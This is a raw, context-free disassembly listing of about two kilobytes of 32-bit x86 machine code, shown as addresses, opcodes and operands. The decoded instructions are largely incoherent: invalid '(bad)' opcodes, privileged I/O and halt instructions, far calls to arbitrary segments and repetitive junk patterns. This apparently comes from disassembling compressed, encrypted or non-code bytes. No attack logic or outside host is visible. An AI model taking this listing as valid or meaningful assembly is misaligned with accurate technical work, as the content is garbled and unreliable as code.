  4081f4:	stc    
  4081f5:	jmp    0x408237
  4081f7:	pop    esi
  4081f8:	and    DWORD PTR [ebp-0x60],edi
  4081fb:	or     edi,edi
  4081fd:	jmp    0x4081ea
  4081ff:	push   esi
  408200:	daa    
  408201:	jge    0x40820c
  408203:	or     ebp,edi
  408205:	jmp    0x4081ec
  408207:	push   esi
  408208:	and    eax,0xcc090b7d
  40820d:	int3   
  40820e:	cmp    dh,BYTE PTR [ecx-0xf4e7df4]
  408214:	fcom   st(2)
  408216:	push   edx
  408217:	pop    DWORD PTR [esi]
  408219:	je     0x4081cd
  40821b:	and    dh,bl
  40821d:	scas   eax,DWORD PTR es:[edi]
  40821e:	ficom  DWORD PTR [eax-0xd4f44fc]
  408224:	cld    
  408225:	sbb    ah,al
  408227:	mov    bl,BYTE PTR [edx]
  408229:	and    eax,0xe3c2d4e5
  40822e:	push   eax
  40822f:	inc    esi
  408230:	sbb    BYTE PTR [esp+edx*8+0x12],bh
  408234:	shl    al,0xce
  408237:	or     eax,0x322e661e
  40823c:	(bad)  
  40823d:	lock enter 0x124d,0xf9
  408242:	cmp    eax,0xc96fca8d
  408247:	rcl    BYTE PTR [eax],cl
  408249:	call   0xb5d2:0xec8d43b
  408250:	push   ss
  408251:	mov    ebp,0x7c01ce0
  408256:	and    DWORD PTR [eax+0x19],eax
  408259:	mov    ecx,0xa9c31ec0
  40825e:	loope  0x4082be
  408260:	add    bh,BYTE PTR [esi]
  408262:	retf   
  408263:	add    dl,bl
  408265:	push   eax
  408266:	and    bl,BYTE PTR [ecx+ebx*1+0x39]
  40826a:	rol    BYTE PTR [edx],0xc0
  40826d:	scas   al,BYTE PTR es:[edi]
  40826e:	and    DWORD PTR [edx+0x19],ebx
  408271:	cdq    
  408272:	rol    BYTE PTR [edi+edx*2],0x7b
  408276:	mov    esi,0x5fb18258
  40827b:	push   es
  40827c:	pop    edi
  40827d:	aas    
  40827e:	mov    esi,0x82755a56
  408283:	sti    
  408284:	ds adc dl,ah
  408287:	or     al,0xc6
  408289:	icebp  
  40828a:	jnp    0x4082de
  40828c:	pusha  
  40828d:	imul   edi,DWORD PTR [esi+0x5f80860a],0x54
  408294:	pop    edi
  408295:	adc    al,0xbe
  408297:	or     BYTE PTR [edx-0x6c],ch
  40829a:	pop    edi
  40829b:	push   esi
  40829c:	pop    edi
  40829d:	sbb    bh,BYTE PTR [esi-0x758bfefa]
  4082a3:	add    BYTE PTR [edi],dh
  4082a5:	loop   0x40830f
  4082a7:	pop    edi
  4082a8:	jmp    0x421221
  4082ad:	aaa    
  4082ae:	mov    ebp,0x5fa38600
  4082b3:	pop    esi
  4082b4:	pop    edi
  4082b5:	ss mov esi,0xbbd6a21e
  4082bb:	lea    edx,[edi+0x47]
  4082be:	mov    esi,0x5fd0821c
  4082c3:	inc    edx
  4082c4:	pop    edi
  4082c5:	inc    ebp
  4082c6:	mov    esi,0x5fd2861a
  4082cb:	inc    esp
  4082cc:	pop    edi
  4082cd:	dec    ebx
  4082ce:	mov    esi,0x5fdc8618
  4082d3:	inc    esi
  4082d4:	pop    edi
  4082d5:	dec    ecx
  4082d6:	lods   eax,DWORD PTR ds:[esi]
  4082d7:	push   ss
  4082d8:	push   0xa
  4082da:	cwde   
  4082db:	jb     0x40830e
  4082dd:	xor    edi,DWORD PTR [esi+0x4e]
  4082e0:	shl    DWORD PTR [esi-0xcf2f662],cl
  4082e6:	jl     0x40833e
  4082e8:	shl    BYTE PTR [ebp-0x20],1
  4082eb:	or     DWORD PTR [eax+0x2d],edi
  4082ee:	jecxz  0x40835a
  4082f0:	rcr    cl,0x1d
  4082f3:	xor    al,0x1f
  4082f5:	dec    esi
  4082f6:	cld    
  4082f7:	push   0x381ddbc4
  4082fc:	sbb    eax,0x4a64f331
  408301:	mov    ds:0x36e201ef,eax
  408306:	mov    esi,0x5f328e63
  40830b:	aas    
  40830c:	pop    ebx
  40830d:	fdivr  DWORD PTR [esi+0x5f2a8661]
  408313:	and    DWORD PTR [ebx+ecx*1],edi
  408316:	loop   0x408397
  408318:	out    0x9c,eax
  40831a:	cmp    al,0x23
  40831c:	cmp    eax,0xe57ddd0f
  408321:	cwde   
  408322:	cmp    al,0x25
  408324:	and    al,0xd
  408326:	jecxz  0x4083a0
  408328:	cmp    eax,0xe426e4b7
  40832d:	and    BYTE PTR [edi+esi*2],al
  408330:	fidivr DWORD PTR [ebx-0x40d3d5fc]
  408336:	out    0x72,eax
  408338:	je     0x40837f
  40833a:	lods   al,BYTE PTR ds:[esi]
  40833b:	sub    al,0xac
  40833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833e:	int    0x70
  408340:	jne    0x40838c
  408342:	lods   al,BYTE PTR ds:[esi]
  408343:	lods   al,BYTE PTR cs:[esi]
  408345:	mov    ebp,0x63734e4d
  40834a:	sub    al,0xd1
  40834c:	stos   DWORD PTR es:[edi],eax
  40834d:	mov    eax,0xbb5790fc
  408352:	ror    bh,0x90
  408355:	sub    eax,0xbb479026
  40835a:	(bad)  
  40835b:	test   eax,0x66242252
  408360:	fisub  DWORD PTR [edx-0x2e]
  408363:	pop    ebx
  408364:	sar    bl,cl
  408366:	xor    ebx,DWORD PTR [ebx+ebp*1]
  408369:	ins    BYTE PTR es:[edi],dx
  40836a:	ror    BYTE PTR [ebp-0x3e],cl
  40836d:	stc    
  40836e:	dec    edi
  40836f:	push   es
  408370:	fsubr  QWORD PTR [esi-0x7d]
  408373:	and    bh,cl
  408375:	loop   0x408318
  408377:	dec    edi
  408378:	pop    ss
  408379:	je     0x4083c0
  40837b:	add    ch,cl
  40837d:	loop   0x408326
  40837f:	pop    edi
  408380:	or     al,ah
  408382:	rcl    dh,0xd2
  408385:	test   eax,0xb90810ca
  40838a:	add    bl,BYTE PTR [ecx-0x30]
  40838d:	cmp    DWORD PTR [edx],0x5a
  408390:	add    dl,BYTE PTR [edx+0x7cdb04cb]
  408396:	cld    
  408397:	mov    BYTE PTR [edi+edi*4],cl
  40839a:	dec    esi
  40839b:	iret   
  40839c:	aam    0x2f
  40839e:	adc    BYTE PTR [eax-0x309c44fe],0xda
  4083a5:	sub    eax,0x880090cc
  4083aa:	ss rcr al,cl
  4083ad:	sub    eax,DWORD PTR [ebp+0x3bd3b32]
  4083b3:	or     al,0xd2
  4083b5:	or     DWORD PTR [ebx],edx
  4083b7:	push   eax
  4083b8:	push   edx
  4083b9:	adc    eax,0x2f28c917
  4083be:	clc    
  4083bf:	or     dl,al
  4083c1:	mov    ebx,0xd36b591f
  4083c6:	cld    
  4083c7:	pop    es
  4083c8:	mov    dl,0x4d
  4083ca:	sbb    eax,0xfcbc1b31
  4083cf:	ins    BYTE PTR es:[edi],dx
  4083d0:	les    esp,FWORD PTR [eax]
  4083d2:	sbb    eax,0xfccf6b32
  4083d7:	push   0xffffffb2
  4083d9:	mov    ah,0x1d
  4083db:	aaa    
  4083dc:	sbb    ecx,DWORD PTR [esp+edi*8+0x64]
  4083e0:	les    ebx,FWORD PTR [ebp-0x79e2c2e3]
  4083e6:	cld    
  4083e7:	pusha  
  4083e8:	(bad)  
  4083e9:	and    DWORD PTR ds:0x11f7733e,ebx
  4083ef:	push   esi
  4083f0:	bnd jge 0x4083e8
  4083f3:	or     BYTE PTR [ebx],al
  4083f5:	jmp    0x408411
  4083f7:	push   edi
  4083f8:	retf   0xf981
  4083fb:	or     BYTE PTR [ebx],dl
  4083fd:	pop    ds
  4083fe:	push   ds
  4083ff:	push   esi
  408400:	pop    eax
  408401:	jge    0x4083e2
  408403:	or     DWORD PTR [eax-0x95f3975],eax
  408409:	xchg   edx,eax
  40840a:	add    edx,DWORD PTR [ecx]
  40840c:	mov    al,ds:0x394fc7c3
  408411:	push   esp
  408412:	adc    BYTE PTR [ebx],0xc0
  408415:	rol    DWORD PTR [ecx],0x4d
  408418:	sbb    DWORD PTR [esi-0x40],edx
  40841b:	adc    eax,0x4b21c7c0
  408420:	sbb    DWORD PTR [eax-0x40],edx
  408423:	pop    ss
  408424:	rol    ch,0x21
  408427:	dec    ecx
  408428:	sbb    DWORD PTR [edx-0x40],edx
  40842b:	sbb    eax,eax
  40842d:	retf   
  40842e:	and    DWORD PTR [edi+0x19],eax
  408431:	pop    esp
  408432:	rcr    BYTE PTR [ebx],0xc0
  408435:	leave  
  408436:	and    DWORD PTR [ebp+0x19],eax
  408439:	pop    esi
  40843a:	rcr    BYTE PTR ds:0x4321cfc0,0x19
  408441:	pop    eax
  408442:	rcr    BYTE PTR [edi],0xc0
  408445:	int    0x21
  408447:	inc    ecx
  408448:	sbb    DWORD PTR [edx-0x40],ebx
  40844b:	add    eax,eax
  40844d:	repz and DWORD PTR [edi+0x19],ebx
  408451:	rol    BYTE PTR fs:[ebx],0xc0
  408455:	icebp  
  408456:	and    DWORD PTR [ebp+0x19],ebx
  408459:	data16 rol BYTE PTR ds:0x5b21f7c0,0x19
  408461:	pusha  
  408462:	rol    BYTE PTR [edi],0xc0
  408465:	cmc    
  408466:	and    DWORD PTR [ecx+0x19],ebx
  408469:	(bad)  
  40846a:	ror    BYTE PTR [ecx],0xc0
  40846d:	sti    
  40846e:	and    DWORD PTR [edi+0x19],edx
  408471:	ins    BYTE PTR es:[edi],dx
  408472:	ror    BYTE PTR [ebx],0xc0
  408475:	stc    
  408476:	and    cl,BYTE PTR [edi]
  408478:	test   DWORD PTR [ecx+ebx*1-0x3fd67e01],0x20b95992
  408483:	iret   
  408484:	xchg   DWORD PTR ds:0xbb5f90c6,ebp
  40848a:	es iret 
  40848c:	test   DWORD PTR ds:0xbb5d90c4,ebp
  408492:	and    al,0xcf
  408494:	mov    ebp,DWORD PTR ds:0xbb5390ca
  40849a:	sub    cl,bh
  40849c:	mov    DWORD PTR [ebx+0x3b],eax
  40849f:	add    eax,0x5d23e46f
  4084a4:	rcr    BYTE PTR [edi],cl
  4084a6:	xor    eax,DWORD PTR [ebx]
  4084a8:	or     DWORD PTR [edx-0x1b],ebp
  4084ab:	pop    edi
  4084ac:	and    eax,0xf5566deb
  4084b1:	jge    0x408446
  4084b3:	or     DWORD PTR [ebx],esi
  4084b5:	jmp    0x40852a
  4084b7:	push   eax
  4084b8:	jmp    0x408539
  4084ba:	xchg   ecx,eax
  4084bb:	or     DWORD PTR [ecx],esi
  4084bd:	jmp    0x408530
  4084bf:	push   esi
  4084c0:	jmp    0x374a1c42
  4084c5:	jmp    0x40853e
  4084c7:	push   esi
  4084c8:	out    dx,eax
  4084c9:	jge    0x408460
  4084cb:	or     DWORD PTR ds:0xed5675eb,esi
  4084d1:	jge    0x40846e
  4084d3:	or     DWORD PTR [ebx],edi
  4084d5:	jmp    0x408552
  4084d7:	push   esi
  4084d8:	jecxz  0x408557
  4084da:	cdq    
  4084db:	or     DWORD PTR [ecx],edi
  4084dd:	jmp    0x408558
  4084df:	push   esi
  4084e0:	loope  0x40855f
  4084e2:	lahf   
  4084e3:	or     DWORD PTR [edi],edi
  4084e5:	jmp    0x408566
  4084e7:	push   esi
  4084e8:	out    0x7d,eax
  4084ea:	popf   
  4084eb:	or     DWORD PTR ds:0xe5567deb,edi
  4084f1:	jge    0x4084d6
  4084f3:	or     DWORD PTR [ebx],eax
  4084f5:	jmp    0x4084fa
  4084f7:	push   esi
  4084f8:	fstp   TBYTE PTR [ebp-0x1f]
  4084fb:	or     DWORD PTR [ecx],eax
  4084fd:	jmp    0x408500
  4084ff:	push   esi
  408500:	fnstcw WORD PTR [ebp-0x19]
  408503:	imul   ebp,esp,0xdf5607eb
  408509:	jge    0x4084f0
  40850b:	or     DWORD PTR ds:0xdd5605eb,eax
  408511:	jge    0x4084fe
  408513:	or     DWORD PTR [ebx],ecx
  408515:	jmp    0x408522
  408517:	push   esi
  408518:	sar    DWORD PTR [ebp-0x17],cl
  40851b:	or     DWORD PTR [ecx],ecx
  40851d:	jmp    0x408528
  40851f:	push   esi
  408520:	sar    DWORD PTR [ebp-0x11],1
  408523:	or     DWORD PTR [edi],ecx
  408525:	jmp    0x408536
  408527:	push   esi
  408528:	xlat   BYTE PTR ds:[ebx]
  408529:	jge    0x408518
  40852b:	or     DWORD PTR ds:0xd5560deb,ecx
  408531:	jge    0x408526
  408533:	or     DWORD PTR [ebx],edx
  408535:	jmp    0x40854a
  408537:	push   esi
  408538:	retf   
  408539:	jge    0x40852c
  40853b:	or     DWORD PTR [ecx],edx
  40853d:	jmp    0x408550
  40853f:	push   esi
  408540:	leave  
  408541:	jge    0x40853a
  408543:	or     DWORD PTR [edi],edx
  408545:	jmp    0x40855e
  408547:	push   esi
  408548:	iret   
  408549:	jge    0x408540
  40854b:	or     DWORD PTR ds:0xcd5615eb,edx
  408551:	jge    0x40854e
  408553:	or     DWORD PTR [ebx],ebx
  408555:	jmp    0x408572
  408557:	push   esi
  408558:	ret    
  408559:	jge    0x408554
  40855b:	or     DWORD PTR [ecx],ebx
  40855d:	jmp    0x40857b
  40855f:	push   esi
  408560:	les    edi,FWORD PTR [ebp-0x4]
  408563:	or     DWORD PTR [ebx+ebp*8],ebx
  408566:	and    dl,BYTE PTR [esi-0x46]
  408569:	jge    0x40852d
  40856b:	or     DWORD PTR [edx-0x15],esp
  40856e:	and    BYTE PTR [esi-0x48],dl
  408571:	jge    0x408533
  408573:	or     DWORD PTR [eax-0x15],esp
  408576:	es push esi
  408578:	mov    esi,0x6609c67d
  40857d:	jmp    0x4085a3
  40857f:	push   esi
  408580:	mov    esp,0x6409c47d
  408585:	jmp    0x4085b1
  408587:	push   esi
  408588:	mov    dl,0x7d
  40858a:	retf   0x6a09
  40858d:	jmp    0x4085b7
  40858f:	push   esi
  408590:	mov    al,0x7d
  408592:	enter  0x6809,0xeb
  408596:	cs push esi
  408598:	mov    dh,0x7d
  40859a:	into   
  40859b:	or     DWORD PTR [esi-0x15],ebp
  40859e:	xor    dl,BYTE PTR [esi-0x56]
  4085a1:	jge    0x408575
  4085a3:	or     DWORD PTR [edx-0x15],esi
  4085a6:	xor    BYTE PTR [esi-0x58],dl
  4085a9:	jge    0x40857b
  4085ab:	or     DWORD PTR [eax-0x15],esi
  4085ae:	ss push esi
  4085b0:	scas   al,BYTE PTR es:[edi]
  4085b1:	jge    0x408589
  4085b3:	or     DWORD PTR [esi-0x15],esi
  4085b6:	xor    al,0x56
  4085b8:	lods   al,BYTE PTR ds:[esi]
  4085b9:	jge    0x40858f
  4085bb:	or     DWORD PTR [ebx+ebp*8+0x3a],esi
  4085bf:	push   esi
  4085c0:	mov    ds:0x7a09da7d,al
  4085c5:	jmp    0x40862a
  4085c7:	push   edx
  4085c8:	retf   
  4085c9:	or     DWORD PTR [di],0x5261f911
  4085d0:	leave  
  4085d1:	ja     0x40855a
  4085d3:	or     eax,0x5667e917
  4085d8:	iret   
  4085d9:	jge    0x408560
  4085db:	or     DWORD PTR ds:0xcd5665eb,edx
  4085e1:	jge    0x40856e
  4085e3:	or     DWORD PTR [ebx],ebx
  4085e5:	jmp    0x408652
  4085e7:	push   esi
  4085e8:	ret    
  4085e9:	jge    0x408574
  4085eb:	or     DWORD PTR [ecx],ebx
  4085ed:	jmp    0x408658
  4085ef:	push   esi
  4085f0:	sar    DWORD PTR [ebp-0x71],0x9
  4085f4:	pop    ds
  4085f5:	jmp    0x408666
  4085f7:	push   esi
  4085f8:	(bad)  
  4085f9:	jge    0x408588
  4085fb:	or     DWORD PTR ds:0xc5566deb,ebx
  408601:	jge    0x408596
  408603:	or     DWORD PTR [ebx-0x15],esp
  408606:	jae    0x40865e
  408608:	mov    ebx,0x6109917d
  40860d:	jmp    0x408680
  40860f:	push   esi
  408610:	mov    ecx,0x6709977d
  408615:	jmp    0x40868e
  408617:	push   esi
  408618:	mov    edi,0x6509957d
  40861d:	jmp    0x408694
  40861f:	push   esi
  408620:	mov    ebp,0x6b099b7d
  408625:	jmp    0x4086a2
  408627:	push   esi
  408628:	mov    bl,0x7d
  40862a:	cdq    
  40862b:	or     DWORD PTR [ecx-0x15],ebp
  40862e:	jns    0x408686
  408630:	mov    cl,0x7d
  408632:	lahf   
  408633:	or     DWORD PTR [edi-0x15],ebp
  408636:	jg     0x40868e
  408638:	mov    bh,0x7d
  40863a:	popf   
  40863b:	or     DWORD PTR [ebp-0x15],ebp
  40863e:	jge    0x408696
  408640:	mov    ch,0x7d
  408642:	jecxz  0x40864d
  408644:	jae    0x408631
  408646:	add    edx,DWORD PTR [esi-0x55]
  408649:	jge    0x40862c
  40864b:	or     DWORD PTR [ecx-0x15],esi
  40864e:	add    DWORD PTR [esi-0x57],edx
  408651:	jge    0x40863a
  408653:	or     DWORD PTR [edi-0x15],esi
  408656:	pop    es
  408657:	push   esi
  408658:	scas   eax,DWORD PTR es:[edi]
  408659:	jge    0x408640
  40865b:	or     DWORD PTR [ebp-0x15],esi
  40865e:	add    eax,0xeb7dad56
  408663:	or     DWORD PTR [ebx-0x15],edi
  408666:	or     edx,DWORD PTR [esi-0x5d]
  408669:	jge    0x408654
  40866b:	or     DWORD PTR [ecx-0x15],edi
  40866e:	or     DWORD PTR [esi-0x5f],edx
  408671:	jge    0x408662
  408673:	or     DWORD PTR [edi-0x15],edi
  408676:	orps   xmm4,XMMWORD PTR [edi+0x7d09ed7d]
  40867d:	jmp    0x40868c
  40867f:	push   esi
  408680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408681:	jge    0x408676
  408683:	or     DWORD PTR [ebx-0x15],eax
  408686:	adc    edx,DWORD PTR [esi-0x65]
  408689:	jge    0x40867c
  40868b:	or     DWORD PTR [ecx-0x15],eax
  40868e:	adc    DWORD PTR [esi-0x67],edx
  408691:	jge    0x40868a
  408693:	imul   esp,DWORD PTR [ecx],0x127bd333
  408699:	push   ebx
  40869a:	mov    al,ds:0x4a1cf433
  40869f:	jbe    0x408665
  4086a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086a2:	cli    
  4086a3:	or     ecx,edi
  4086a5:	nop
  4086a6:	and    BYTE PTR [ebp-0xb],dh
  4086a9:	or     eax,0xce03cfff
  4086ae:	cmp    dh,BYTE PTR [eax+0x79]
  4086b1:	addr16 cld 
  4086b3:	(bad)  
  4086b4:	stos   DWORD PTR es:[edi],eax
  4086b5:	repz cld 
  4086b7:	mov    ds,WORD PTR [ebx]
  4086b9:	jge    0x40867c
  4086bb:	jb     0x40867e
  4086bd:	lock int 0x26
  4086c0:	push   ds
  4086c1:	mov    ebx,0xf5db1403
  4086c6:	inc    ecx
  4086c7:	dec    esp
  4086c8:	sbb    eax,0x1d19ab8a
  4086cd:	xor    ebp,DWORD PTR [ebx]
  4086cf:	push   esi
  4086d0:	adc    BYTE PTR [esi],al
  4086d2:	rcr    DWORD PTR [edx],0x2c
  4086d5:	fwait
  4086d6:	cs nop
  4086d8:	fisubr DWORD PTR [eax-0x25]
  4086db:	pop    ds
  4086dc:	mov    al,ds:0x974e2df0
  4086e1:	mov    ah,0xd3
  4086e3:	or     DWORD PTR [edx-0x5],edx
  4086e6:	xor    edx,DWORD PTR [esi-0x7e]
  4086e9:	jne    0x4086bc
  4086eb:	or     DWORD PTR [ebx+ebp*8+0x31],ebx
  4086ef:	push   esi
  4086f0:	jnp    0x40876f
  4086f2:	xlat   BYTE PTR ds:[ebx]
  4086f3:	or     DWORD PTR [edi+0x7c5637eb],esp
  4086f9:	jge    0x4086d0
  4086fb:	or     DWORD PTR [esi+0x745635eb],ebp
  408701:	jge    0x4086de
  408703:	popa   
  408704:	mov    cl,0x37
  408706:	rcl    DWORD PTR [edi+0x70],cl
  408709:	mov    edi,0xe3550b1d
  40870e:	cmp    eax,0x8b45620c
  408713:	loop   0x4086a4
  408715:	stos   DWORD PTR es:[edi],eax
  408716:	sahf   
  408717:	inc    esi
  408718:	test   al,0xb9
  40871a:	and    cl,BYTE PTR [ecx+ebx*1+0x40]
  40871e:	cld    
  40871f:	adc    dh,al
  408721:	std    
  408722:	sbb    al,0x51
  408724:	inc    edi
  408725:	pop    ss
  408726:	arpl   si,sp
  408728:	pop    eax
  408729:	adc    al,0x80
  40872b:	rol    DWORD PTR [edi+0x73086757],cl
  408731:	and    dh,BYTE PTR [ecx]
  408733:	pop    ecx
  408734:	pop    es
  408735:	mov    edx,0x2e6b048a
  40873a:	add    DWORD PTR [ebp+0x1b],ebx
  40873d:	sbb    edi,DWORD PTR ds:0x144548e4
  408743:	clc    
  408744:	xor    bl,BYTE PTR [ebx+0x53]
  408747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408748:	fmul   DWORD PTR [ecx+0x37f1fc66]
  40874e:	shl    ebx,1
  408750:	fadd   st,st(0)
  408752:	cmp    BYTE PTR [ebx],ah
  408754:	or     al,0xe2
  408756:	rol    BYTE PTR [eax-0x4a8c5805],cl
  40875c:	pop    es
  40875d:	inc    edx
  40875e:	dec    ebx
  40875f:	mov    ebp,eax
  408761:	xlat   BYTE PTR ds:[ebx]
  408762:	pop    es
  408763:	xlat   BYTE PTR ds:[ebx]
  408764:	imul   eax,DWORD PTR [eax+0x53],0xffffff89
  408768:	fcom   st(1)
  40876a:	fnstenv [bp-0x66]
  40876e:	jecxz  0x40872c
  408770:	lods   al,BYTE PTR ds:[esi]
  408771:	mov    eax,ds:0x8274b901
  408776:	loope  0x408704
  408778:	call   0xee5f:0x42500ae1
  40877f:	mov    edi,0xe3080c98
  408784:	inc    eax
  408785:	xor    eax,0xefbeefef
  40878a:	or     al,0x78
  40878c:	dec    eax
  40878d:	add    cl,al
  40878f:	mov    ebx,ds
  408791:	add    eax,0xbdaad167
  408796:	push   0xffffffea
  408798:	ja     0x408722
  40879a:	jmp    0x40875c
  40879c:	mov    dl,0x82
  40879e:	mov    dl,0x8c
  4087a0:	push   0xaa6252c1
  4087a5:	popa   
  4087a6:	push   ebx
  4087a7:	mov    edi,0xb550a76e
  4087ac:	mov    dh,0x37
  4087ae:	dec    ebx
  4087af:	cmp    al,ch
  4087b1:	mov    al,ds:0x356b6607
  4087b6:	push   ebx
  4087b7:	fsub   DWORD PTR ss:[edx-0x65f49799]
  4087be:	pop    esi
  4087bf:	mov    esp,0xb9b9a1d9
  4087c4:	add    al,BYTE PTR [edx-0x332773a7]
  4087ca:	mov    esi,0x538debe1
  4087cf:	sbb    eax,0x1a
  4087d2:	fisttp WORD PTR [bx+di-0x5766]
  4087d7:	mov    esp,0xe048a351
  4087dc:	addr16 mov edi,0x975727ae
  4087e2:	dec    esi
  4087e3:	aad    0x8d
  4087e5:	pop    ebx
  4087e6:	lods   al,BYTE PTR ds:[esi]
  4087e7:	aas    
  4087e8:	push   ebp
  4087e9:	scas   eax,DWORD PTR es:[edi]
  4087ea:	dec    esp
  4087eb:	pop    ecx
  4087ec:	addr16 mov ds:0x27a2,eax
  4087f0:	dec    ebx
  4087f1:	xchg   edi,eax
  4087f2:	inc    edx
  4087f3:	aad    0x91
  4087f5:	pop    ebx
  4087f6:	mov    al,ds:0x40a7493f
  4087fb:	mov    ch,0x97
  4087fd:	ja     0x40884a
  4087ff:	sbb    ebp,eax
  408801:	loopne 0x40880a
  408803:	inc    edi
  408804:	imul   esi,DWORD PTR [ebp+0x53],0x19
  408808:	fsub   st,st(2)
  40880a:	addr16 dec ecx
  40880c:	dec    ebx
  40880d:	call   0x839d:0xa093bc7b
  408814:	fld    TBYTE PTR [ebx+edi*8-0x52bb1992]
  40881b:	mov    ch,0xe1
  40881d:	addr16 dec ebx
  40881f:	ins    DWORD PTR es:[edi],dx
  408820:	call   0x6b759015
  408825:	gs push ebx
  408827:	imul   ebx,eax,0xfffffff2
  40882a:	addr16 aaa 
  40882c:	pop    ebx
  40882d:	call   0xb9eb:0xa183bc05
  408834:	pop    ecx
  408835:	or     BYTE PTR [ebx],0x8c
  408838:	add    ecx,0xd8aa8de9
  40883e:	rcl    bl,1
  408840:	fimul  WORD PTR [ecx+0x6b]
  408843:	(bad)  
  408844:	mov    dl,0xde
  408846:	loopne 0x408819
  408848:	mov    esi,0xec78a34b
  40884d:	add    DWORD PTR [ebx-0x76],eax
  408850:	sub    cl,ch
  408852:	mov    eax,ds:0x4131f260
  408857:	jmp    0x82f0:0xe0eb0128
  40885e:	inc    edi
  40885f:	mov    WORD PTR [esi],gs
  408861:	shl    DWORD PTR [ebp-0x2f6b55dc],0x4f
  408868:	fisub  WORD PTR ds:0xb2b2136b
  40886e:	loopne 0x4088bd
  408870:	mov    esi,0x8079c727
  408875:	adc    al,BYTE PTR [ebx+0x47]
  408878:	jmp    0xca10899e
  40887d:	push   edi
  40887e:	addr16 inc ebp
  408880:	jae    0x408860
  408882:	xor    DWORD PTR ds:0xead34f05,ebx
  408888:	popf   
  408889:	fsubr  DWORD PTR [ebx-0x18ecc44f]
  40888f:	pop    ebx
  408890:	jge    0x40888d
  408892:	mov    edi,0xc2527ae3
  408897:	fs fwait
  408899:	cmp    BYTE PTR ds:0x4a9c187a,dh
  40889f:	scas   al,BYTE PTR es:[edi]
  4088a0:	fnstcw WORD PTR [edx+0x59]
  4088a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088a4:	adc    eax,0xfadd9a3f
  4088a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088aa:	repnz mov ds:0xa1d8141c,al
  4088b0:	jnp    0x408837
  4088b2:	push   0x3f0211f5
  4088b7:	repnz clc 
  4088b9:	mov    eax,0x5d802523
  4088be:	dec    edx
  4088bf:	aam    0xa7
  4088c1:	xlat   BYTE PTR ds:[ebx]
  4088c2:	addr16 icebp 
  4088c4:	lock pop edi
  4088c6:	lock mov eax,0xd08815d7
  4088cc:	and    ebx,DWORD PTR [esi-0x2abef99]
  4088d2:	cwde   
  4088d3:	adc    al,0x82
  4088d5:	adc    al,0x75
  4088d7:	cmp    esi,edi
  4088d9:	add    bh,BYTE PTR [eax]
  4088db:	and    DWORD PTR [ebx],esi
  4088dd:	das    
  4088de:	data16 xor al,al
  4088e1:	pushf  
  4088e2:	xlat   BYTE PTR ds:[ebx]
  4088e3:	jg     0x408943
  4088e5:	inc    ebx
  4088e6:	mov    eax,0x7425b661
  4088eb:	ret    
  4088ec:	jge    0x408918
  4088ee:	mov    cl,0x56
  4088f0:	loopne 0x408877
  4088f2:	push   ebx
  4088f3:	jo     0x4088d2
  4088f5:	lods   eax,DWORD PTR ds:[esi]
  4088f6:	fbstp  TBYTE PTR [ecx+0x55232ede]
  4088fc:	call   0x2ca8272
  408901:	adc    ecx,DWORD PTR [ebx+0x259f82f1]
  408907:	ja     0x4088ff
  408909:	pop    ss
  40890a:	push   ebx
  40890b:	add    ecx,DWORD PTR [edi]
  40890d:	xchg   ebp,eax
  40890e:	mov    bl,0x23
  408910:	cli    
  408911:	gs sti 
  408913:	aad    0xcf
  408915:	in     al,0x27
  408917:	pop    esp
  408918:	pop    es
  408919:	test   DWORD PTR [ebx-0x75],ebx
  40891c:	jno    0x4088a4
  40891e:	in     eax,dx
  40891f:	jecxz  0x4088e0
  408921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408922:	and    ebx,ebx
  408924:	xor    BYTE PTR [ebx-0x17252fb8],0x20
  40892b:	or     bl,bl
  40892d:	repnz sbb al,0xae
  408930:	cmp    cl,0xac
  408933:	hlt    
  408934:	les    esp,FWORD PTR ds:0xc6fa670a
  40893a:	sahf   
  40893b:	and    al,0x2e
  40893d:	cmp    bl,cl
  40893f:	sbb    ecx,edi
  408941:	test   DWORD PTR [eax-0xc7cd267],ecx
  408947:	fldcw  WORD PTR [esi]
  408949:	aad    0x23
  40894b:	ins    DWORD PTR es:[edi],dx
  40894c:	cli    
  40894d:	jns    0x408987
  40894f:	xchg   ebp,eax
  408950:	push   0xdff18631
  408955:	cmc    
  408956:	jp     0x40895c
  408958:	(bad)  
  408959:	outs   dx,BYTE PTR ds:[esi]
  40895a:	pop    esi
  40895b:	push   ds
  40895c:	and    ebp,DWORD PTR [edx+0x2c97e89f]
  408962:	inc    esi
  408963:	fsub   st,st(2)
  408965:	outs   dx,BYTE PTR ds:[esi]
  408966:	and    BYTE PTR [esi+0x185536fc],ch
  40896c:	in     eax,dx
  40896d:	xchg   ebp,eax
  40896e:	bound  edi,QWORD PTR [ebx+0x6]
  408971:	ins    DWORD PTR es:[edi],dx
  408972:	and    esi,esp
  408974:	mov    edx,0x593fe6ac
  408979:	push   ebp
  40897a:	mov    ah,0xf1
  40897c:	enter  0x6a79,0x32
  408980:	iret   
  408981:	(bad)  
  408983:	out    0x23,al
  408985:	cs mov ecx,0xa37f39b2
  40898b:	test   BYTE PTR ds:0x600fac13,0x10
  408992:	pop    esi
  408993:	dec    edi
  408994:	ins    BYTE PTR es:[edi],dx
  408995:	ja     0x408958
  408997:	ja     0x408923
  408999:	ins    BYTE PTR es:[edi],dx
  40899a:	mov    ebx,0x3ae2a730
  40899f:	xchg   ebp,eax
  4089a0:	ds xchg ebp,eax
  4089a2:	inc    esp
  4089a3:	icebp  
  4089a4:	mov    ebp,0x2e6445b5
  4089a9:	sti    
  4089aa:	mov    dl,0x23
  4089ac:	and    al,0x16
  4089ae:	mov    esp,DWORD PTR [ebp+0x6b82ef2a]
  4089b4:	adc    eax,0x12a80b87
  4089b9:	fucomi st,st(5)
  4089bb:	call   DWORD PTR [edx+0x24]
  4089be:	mov    cl,0x4a
  4089c0:	ins    DWORD PTR es:[edi],dx
  4089c1:	test   esp,ebp
  4089c3:	mov    cs,esi
  4089c5:	xor    eax,0x57fa6583
  4089ca:	jp     0x4089fb
  4089cc:	pop    ss
  4089cd:	pushf  
  4089ce:	jno    0x408a28
  4089d0:	add    al,BYTE PTR [ebp+0x7145c30e]
  4089d6:	inc    esp
  4089d7:	mov    ah,0xc4
  4089d9:	shl    BYTE PTR [edx+eiz*8],0x5a
